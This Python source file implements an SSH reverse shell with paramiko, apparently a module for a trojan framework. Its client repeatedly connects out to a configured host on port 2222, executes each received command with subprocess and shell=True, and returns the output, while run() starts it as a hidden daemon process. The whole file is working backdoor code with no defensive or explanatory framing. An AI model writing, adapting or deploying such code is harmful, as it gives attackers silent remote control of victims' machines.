import time
import importlib
import threading
import paramiko



# 在线导入第三方库的方法
multiprocessing = importlib.import_module('multiprocessing')
signal = importlib.import_module('signal')
subprocess = importlib.import_module('subprocess')


HOST = ''
PORT = 2222
USERNAME = ''
PASSWORD = ''




# Java风格，继承接口，并定义接口要求的函数
class Server(paramiko.ServerInterface):
    def __init__(self, username, password) -> None:
        super().__init__()
        self.event = threading.Event()
        self.username = username
        self.password = password

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == self.username) and (password == self.password):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED





def ssh_reverse_client(host, port, username, password):
    while True:
        try:
            #print('SSH Reverse Client...')
            time.sleep(5)

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password)

            my_session = client.get_transport().open_session()
            #print('SSH Reverse Client Succeed!')

            while True:

                if my_session.active:
                    try:
                        def handler(signum, frame):
                            raise TimeoutError
                        signal.signal(signal.SIGALRM, handler)
                        signal.alarm(5)

                        cmd = my_session.recv(4096).decode().strip()
                        output = subprocess.check_output(cmd, shell=True)
                        my_session.send(output or b'ok')

                    except TimeoutError:
                        continue
                        
                    finally:
                        signal.alarm(0)#取消定时器

                else:
                    #print("Connection failed.")
                    break


        except Exception:
            continue





def run(**args):
    p = multiprocessing.Process(target=ssh_reverse_client, kwargs={'host': HOST, 'port': PORT, 'username': USERNAME, 'password': PASSWORD})

    #后台运行
    p.daemon = True
    p.start()
    return 'Success'
